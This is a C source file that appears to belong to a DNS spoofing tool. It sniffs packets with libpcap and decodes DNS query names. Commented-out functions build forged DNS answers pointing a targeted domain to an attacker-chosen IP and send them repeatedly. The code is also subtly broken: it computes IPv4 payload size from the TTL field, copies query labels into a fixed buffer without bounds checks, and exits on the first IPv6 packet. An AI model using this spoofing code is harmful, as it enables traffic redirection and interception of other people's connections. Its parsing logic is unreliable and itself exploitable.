#include "spoof.h"


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;

    /* ethernet */
    ether = (struct etherhdr*)(packet);
    if(ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(pkthdr, packet);
    }
    if (ntohs(ether->ether_type) == ETHERTYPE_IPV6) {
        puts("IPV6");
        process_ipv6(pkthdr, packet);
        exit(0);
    }
}

void process_ipv4(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;
    struct iphdr *ip;
    struct udphdr* udp;
    struct dnshdr* dns_hdr;
    struct dnsquery dns_query;

    char* response_packet = NULL;
    char request[URL_SIZE] = {0};
    char response[DEFAULT_SIZE] = {0}, datagram[DEFAULT_SIZE] = {0};
    unsigned short size_payload;

    ether = (struct etherhdr*)(packet);
    /* ip header */
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
    /* udp header */
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));
    /* dns header */
    dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
    /* dns query */
    dns_query.name = ((char*) dns_hdr + 12);

    size_payload = ntohs(ip->ttl) - sizeof(struct ip) + sizeof(struct udphdr);
    if (size_payload > 0) {
        handle_DNS_query(&dns_query, request);
    }
}


void process_ipv6(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;
    struct ip6_hdr *ip;
    struct udphdr* udp;
    struct dnshdr* dns_hdr;
    struct dnsquery dns_query;

    char* response_packet = NULL;
    char request[URL_SIZE] = {0};
    char response[DEFAULT_SIZE] = {0}, datagram[DEFAULT_SIZE] = {0};
    unsigned short size_payload;

    ether = (struct etherhdr*)(packet);
    /* ip header */
    ip = (struct ip6_hdr*)(((char*) ether) + sizeof(struct etherhdr));
    /* udp header */
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct ip6_hdr));
    /* dns header */
    dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
    /* dns query */
    dns_query.name = ((char*) dns_hdr + 12);

    size_payload = ntohs(ip->ip6_ctlun.ip6_un1.ip6_un1_plen) - sizeof(struct udphdr);
    if (size_payload > 0) {
        handle_DNS_query(&dns_query, request);
    }
//
}




//void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
//    struct udphdr *udp;
//    struct iphdr *ip;
//    struct dnsquery dns_query;
//    struct dnshdr *dns_hdr;
//    char* payload = NULL;
//    char* response_packet = NULL;
//    char request[100] = {0};
//    char response[2096] = {0};
//
//    int size_ip;
//    int size_udp;
//    int size_payload;
//    uint16_t size_response_payload = 0;
//
//
//
//    size_udp = 8;
//
//    // compute tcp payload (segment) size
//    size_payload = ntohs(ip->ihl) - (size_ip + size_udp);
//    response_packet = response + sizeof(struct ip) + sizeof(struct udphdr);
//
//    // Print payload data, including binary translation
//    if (size_payload > 0) {
//        handle_DNS(args, pkthdr, packet, &dns_hdr, &dns_query);
//        handle_DNS_request(&dns_query, request);
//        if (!strcmp(request, opts.request_url)) {
//            opts.device_port = ntohs(udp->uh_sport);
//            opts.ipid = ip->id;
//            puts("===============HIT==============");
//            size_response_payload = set_payload(dns_hdr, response_packet, request);
//            create_header(response_packet, size_response_payload);
//            size_response_payload += (sizeof(struct ip) + sizeof(struct udphdr));
//            for (int i = 0; i < 10; i++)
//                send_dns_answer(response_packet, size_response_payload);
//        }
//    }
//}


//void handle_DNS (const struct pcap_pkthdr* pkthdr, const u_char* packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query) {
//    struct etherhdr *ether;
//    struct iphdr *ip;
//    struct udphdr *udp;
//    unsigned int ip_header_size;
//
//    /* ethernet header */
//    ether = (struct etherhdr*)(packet);
//
//    /* ip header */
//    ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
//    ip_header_size = ip->ihl * 4;
//    udp = (struct udphdr *)(((char*) ip) + ip_header_size);
//
//    /* dns header */
//    *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
//    dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
//}


/**
 * Extracts the request from a dns query
 * It comes in this format: [3]www[7]example[3]com[0]
 * And it is returned in this: www.example.com
 */
void handle_DNS_query(struct dnsquery* dns_query, char *request) {
    unsigned int i, j, k;
    char *curr = dns_query->name;
    unsigned int size;

    size = (unsigned int) curr[0];

    j=0;
    i=1;
    while(size > 0) {
        for(k=0; k<size; k++) {
            request[j++] = curr[i+k];
        }
        request[j++]='.';
        i+=size;
        size = curr[i++];
    }
    request[--j] = '\0';
    printf("request = %s", request);
}


//uint16_t set_payload(struct dnshdr *dns_hdr, char* response_packet, char* request) {
//    uint16_t size = 0; /* response_packet size */
//    struct dnsquery *dns_query;
//    unsigned char ans[4];
//
//    dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));
//    sscanf(opts.spoofing_ip, "%d.%d.%d.%d",(int *)&ans[0],(int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
//
//    //dns_hdr
//    memcpy(&response_packet[0], dns_hdr->id, 2); //id
//    memcpy(&response_packet[2], "\x81\x80", 2); //flags
//    memcpy(&response_packet[4], "\x00\x01", 2); //qdcount
//    memcpy(&response_packet[6], "\x00\x01", 2); //ancount
//    memcpy(&response_packet[8], "\x00\x00", 2); //nscount
//    memcpy(&response_packet[10], "\x00\x00", 2); //arcount
//
//    //dns_query
//    size = strlen(request) + 2;// +1 for the size of the first string; +1 for the last '.'
//    memcpy(&response_packet[12], dns_query, size); //qname
//    size+=12;
//    memcpy(&response_packet[size], "\x00\x01", 2); //type
//    size+=2;
//    memcpy(&response_packet[size], "\x00\x01", 2); //class
//    size+=2;
//
//    //dns_response_packet
//    memcpy(&response_packet[size], "\xc0\x0c", 2); //pointer to qname
//    size+=2;
//    memcpy(&response_packet[size], "\x00\x01", 2); //type
//    size+=2;
//    memcpy(&response_packet[size], "\x00\x01", 2); //class
//    size+=2;
//    memcpy(&response_packet[size], "\x00\x00\x00\x22", 4); //ttl - 34s
//    size+=4;
//    memcpy(&response_packet[size], "\x00\x04", 2); //rdata length
//    size+=2;
//    memcpy(&response_packet[size], ans, 4); //rdata
//    size+=4;
//
//    return size;
//}
